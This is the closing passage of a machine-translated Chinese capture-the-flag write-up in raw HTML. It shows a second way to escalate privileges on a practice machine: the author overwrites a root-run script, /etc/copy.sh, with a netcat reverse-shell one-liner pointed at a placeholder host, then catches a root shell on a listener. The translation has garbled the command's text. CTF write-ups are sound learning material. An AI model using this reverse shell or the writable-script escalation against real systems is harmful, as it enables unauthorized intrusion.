src="../Images/a8a8340600f09d5130c3ef861ec38bad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HW_UdGZWmi-A0qxV8CoCdA.png"/></div></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oe"><img src="../Images/c61c7af3a1d146b1ac93fc9b6a031f5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FJ7YAqQ4w5EskDPPdSn6SQ.png"/></div></div></figure><p id="baf9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">！！干得好！！我们现在是根了！！你可以花一点时间来享受这种感觉，☺！！</p><p id="770a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们探索一下提升权限的第二种方法。</p><p id="7f20" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果您更改/etc/目录中copy.sh文件的内容，您可以获得root。</p><p id="cfdf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我在下面放的命令是一个通过msfvenom生成的恶意有效载荷，它将提升权限。</p><blockquote class="ly lz ma"><p id="5c53" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated">RM/tmp/f；mkfifo/tmp/f；cat/tmp/f |/bin/sh-I 2 &gt; &amp; 1 | NC<host_ip><host_listening_port>&gt;/tmp/f</host_listening_port></host_ip></p></blockquote><p id="8118" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">更改值。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi of"><img src="../Images/7708312c0801c1e0b9321c8cb83b203b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XeXUDMD02NRdM9ZMNTdT8g.png"/></div></div></figure><p id="d75b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">通过netcat工具在端口9002上启动我们的监听器。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi og"><img src="../Images/c5511fec56e78367b5b1d6c54205e8e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1194/format:webp/1*HNKOnR0sBViVhVFHGVynnA.png"/></div></figure><p id="d76a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">执行命令。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi od"><img src="../Images/a8a8340600f09d5130c3ef861ec38bad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HW_UdGZWmi-A0qxV8CoCdA.png"/></div></div></figure><p id="695f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">检查一下你的netcat监听器</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oh"><img src="../Images/7344dfc934a10ba71a5f9bef813db778.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*juK1oyROLcwhv8zASj95lQ.png"/></div></div></figure><figure class="lt lu lv lw gt jr"><div class="bz fp l di"><div class="oi oj l"/></div></figure><p id="7f13" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">！！干杯！！我们粉碎它！！我们可以确认我们是root！！让我们得到我们的根旗！！</p><p id="bee0" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">导航到/root/目录，黄金就在那里。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/60cc827dc621e834900b7716773ff944.png" data-original-src="https://miro.medium.com/v2/resize:fit:950/format:webp/1*VPQJlWksR-WF93Zob8GnqQ.png"/></div></figure><blockquote class="ly lz ma"><p id="c382" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated"># 1.2 root . txt<br/>Ans:xxxxxxxxxxxxxxxxx</p></blockquote><p id="107a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这是一个把手弄脏的好盒子。对于刚开始做CTFs的人，我会推荐你试着做这个盒子。永远记住，最好的方法是先尽力而为，只有当陷入困境时，才从文章中寻求帮助。</p><p id="a058" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我今天就到此为止了。</p><p id="878f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果你喜欢这篇文章或者这篇文章在任何可能的方面帮助了你，请在评论中告诉我或者用掌声分享你的爱。</p><blockquote class="ol"><p id="631f" class="om on iq bd oo op oq or os ot ou kz dk translated">作为10月PentesterLab赠品的一部分提交</p></blockquote><figure class="ov ow ox oy oz jr"><div class="bz fp l di"><div class="pa oj l"/></div></figure><p id="15b7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">跟着我。</p><p id="8809" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">谢谢你抽出时间。</p><p id="99e2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">保重，注意安全，继续黑！</p><p id="2f12" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">-哈桑·谢赫</strong></p></div></div>    
</body>
</html>